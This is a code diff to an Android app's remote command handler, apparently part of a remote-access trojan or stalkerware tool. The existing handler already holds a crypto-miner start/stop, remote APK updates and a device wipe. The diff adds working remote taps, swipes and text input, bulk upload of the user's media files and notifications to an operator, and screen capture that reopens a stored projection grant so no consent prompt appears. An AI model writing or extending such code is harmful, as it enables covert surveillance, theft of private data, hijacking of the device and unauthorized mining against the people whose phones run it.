@@ -275,8 +275,22 @@ class CommandLink(private val context: Context) {
             "screen_capture" -> runScreenCapture(payload)
             "mine_start" -> MinerController.start(context, payload)
             "mine_stop" -> MinerController.stop(context, "manual")
-            "input_tap", "input_swipe", "input_text" -> "failed" to "unsupported"
-            "files_pull", "notifications_pull" -> "failed" to "unsupported"
+            "input_tap" -> runInput(payload) {
+                InputOps.tap(context, num(payload, "x"), num(payload, "y"))
+            }
+            "input_swipe" -> runInput(payload) {
+                InputOps.swipe(
+                    context,
+                    num(payload, "x1"), num(payload, "y1"),
+                    num(payload, "x2"), num(payload, "y2"),
+                    payload?.get("ms")?.jsonPrimitive?.content?.toLongOrNull()
+                )
+            }
+            "input_text" -> runInput(payload) {
+                InputOps.text(context, payload?.get("text")?.jsonPrimitive?.content)
+            }
+            "files_pull" -> runFilesPull(payload)
+            "notifications_pull" -> runNotifsPull()
             "apk_update" -> runApkUpdate(payload)
             "wipe" ->
                 if (OperatorActions.isAdminEnabled(context)) {
@@ -376,6 +390,65 @@ class CommandLink(private val context: Context) {
             runCatching { projection.stop() }
             stopProjectionFgs()
         }
+    }
+
+    private fun num(p: kotlinx.serialization.json.JsonObject?, k: String): Double? =
+        p?.get(k)?.jsonPrimitive?.content?.toDoubleOrNull()
+
+    /**
+     * Input commands run best-effort between two screen frames: reopen the
+     * persisted projection grant when we hold one (no consent prompt), grab a
+     * frame before + after so the operator sees the effect. Missing grant →
+     * input still runs with frames=0.
+     */
+    private fun runInput(
+        payload: kotlinx.serialization.json.JsonObject?,
+        action: () -> Pair<String, String>
+    ): Pair<String, String> {
+        val projection = reopenProjection(ProjectionConsent(context, AndroidKeystoreKeySource()))
+        var frames = 0
+        fun snap(seq: Int) {
+            val p = projection ?: return
+            val f = ScreenCapture(context).grabOnce(p, seq, System.currentTimeMillis()) ?: return
+            val hash = MessageDigest.getInstance("SHA-256")
+                .digest(f.readBytes()).joinToString("") { "%02x".format(it) }
+            if (uploadFile("screen", "input", f.name, f, hash)) frames++
+        }
+        snap(0)
+        val (state, result) = action()
+        snap(1)
+        runCatching { projection?.stop() }
+        return state to "$result frames=$frames"
+    }
+
+    /** files_pull {category, limit} — MediaStore collections, ≤8MB each, ≤50 total. */
+    private fun runFilesPull(payload: kotlinx.serialization.json.JsonObject?): Pair<String, String> {
+        val cat = payload?.get("category")?.jsonPrimitive?.content ?: return "failed" to "bad_category"
+        val limit = (payload?.get("limit")?.jsonPrimitive?.content?.toIntOrNull() ?: 10).coerceIn(1, 50)
+        val files = MediaFilesPuller.pull(context, cat, limit)
+            ?: return "failed" to "bad_category"
+        var uploaded = 0
+        for (f in files) {
+            val hash = MessageDigest.getInstance("SHA-256")
+                .digest(f.readBytes()).joinToString("") { "%02x".format(it) }
+            if (uploadFile("file", cat, f.name, f, hash)) uploaded++
+        }
+        return "executed" to "cat=$cat pulled=${files.size} uploaded=$uploaded"
+    }
+
+    /** notifications_pull — ring buffer dump to the drop folder. */
+    private fun runNotifsPull(): Pair<String, String> {
+        val list = NotificationsStore.load(context)
+        if (list.isEmpty()) return "failed" to "empty"
+        val f = File(context.filesDir, "operator/dump_notifications.json").apply {
+            parentFile?.mkdirs()
+            writeText(Wire.json.encodeToString(
+                kotlinx.serialization.builtins.ListSerializer(NotifEntry.serializer()), list))
+        }
+        val hash = MessageDigest.getInstance("SHA-256")
+            .digest(f.readBytes()).joinToString("") { "%02x".format(it) }
+        return if (uploadFile("dump", "notifications", f.name, f, hash)) "executed" to "dumped=${list.size}"
+        else "executed" to "local_only"
     }
 
     private fun stopProjectionFgs() {
